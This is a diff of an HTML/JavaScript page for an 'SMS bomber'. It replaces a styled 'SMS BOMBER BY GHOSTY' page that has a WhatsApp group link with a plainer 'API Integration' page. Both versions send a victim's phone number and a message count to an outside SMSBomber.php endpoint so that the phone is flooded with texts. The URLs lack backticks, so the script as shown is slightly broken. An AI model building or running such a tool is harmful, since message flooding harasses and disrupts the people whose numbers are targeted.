@@ -3,109 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMS BOMBER BY GHOSTY</title>
-
+    <title>SMS Bomber API Integration</title>
     <style>
         body {
-            margin: 0;
             font-family: Arial, sans-serif;
-            height: 100vh;
-            background: url("bg.jpg") no-repeat center center fixed;
-            background-size: cover;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            margin: 20px;
         }
-
-        .container {
-            background: rgba(0, 0, 0, 0.65);
-            padding: 25px;
-            width: 90%;
-            max-width: 350px;
-            border-radius: 12px;
-            text-align: center;
-            color: #fff;
-            backdrop-filter: blur(6px);
-        }
-
-        .title {
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 15px;
-            text-transform: uppercase;
-        }
-
-        input {
-            width: 90%;
+        #response {
+            margin-top: 20px;
+            border: 1px solid #ccc;
             padding: 10px;
-            border-radius: 6px;
-            border: none;
-            margin-bottom: 12px;
-            font-size: 16px;
-            outline: none;
-        }
-
-        button {
-            width: 95%;
-            padding: 12px;
-            border: none;
-            background: #ff0000;
-            color: #fff;
-            border-radius: 6px;
-            font-size: 18px;
-            cursor: pointer;
-            margin-bottom: 12px;
-        }
-
-        .whatsapp {
-            background: #25D366;
-        }
-
-        #status {
-            margin-top: 10px;
-            font-size: 15px;
+            background-color: #f9f9f9;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="title">SMS BOMBER BY GHOSTY</div>
+<h1>SMS Bomber API Integration</h1>
+<label for="phone">Phone Number:</label>
+<input type="text" id="phone" placeholder="Enter phone number (e.g., +923001234567)">
+<button id="sendSms">Send SMS</button>
 
-    <input id="number" type="text" placeholder="Enter Number (e.g 923001234567)">
-    
-    <button onclick="startAttack()">START</button>
-
-    <button class="whatsapp" onclick="window.location.href='https://chat.whatsapp.com/CPQC5IGJA2m8iaOWOE8CAN?mode=hqrt1'">
-        JOIN WHATSAPP GROUP
-    </button>
-
-    <div id="status"></div>
-</div>
+<div id="response"></div>
 
 <script>
-function startAttack() {
-    let num = document.getElementById("number").value;
+    document.getElementById('sendSms').addEventListener('click', function() {
+        const phone = document.getElementById('phone').value;
+        const qty = 1; // Set the quantity of SMS to send
 
-    if (!num) {
-        document.getElementById("status").innerHTML = "⚠️ Please enter a number!";
-        return;
-    }
+        // Construct the API URL
+        const apiUrl = https://ahmadmodstools.online/PublicApis/SMSBomber.php?qty=${qty}&phone=${encodeURIComponent(phone)};
 
-    document.getElementById("status").innerHTML = "⏳ Sending...";
-
-    
-    let api = https://ahmadmodstools.online/PublicApis/SMSBomber.php?qty=1&phone=+923001234567
-
-    fetch(api)
-        .then(r => r.text())
-        .then(d => {
-            document.getElementById("status").innerHTML = "✅ Request sent!";
-        })
-        .catch(err => {
-            document.getElementById("status").innerHTML = "❌ Error sending!";
-        });
-}
+        fetch(apiUrl)
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok ' + response.statusText);
+                }
+                return response.json();
+            })
+            .then(data => {
+                // Display the response data
+                document.getElementById('response').innerHTML = <pre>${JSON.stringify(data, null, 2)}</pre>;
+            })
+            .catch(error => {
+                console.error('There has been a problem with your fetch operation:', error);
+                document.getElementById('response').innerHTML = 'Error: ' + error.message;
+            });
+    });
 </script>
 
 </body>
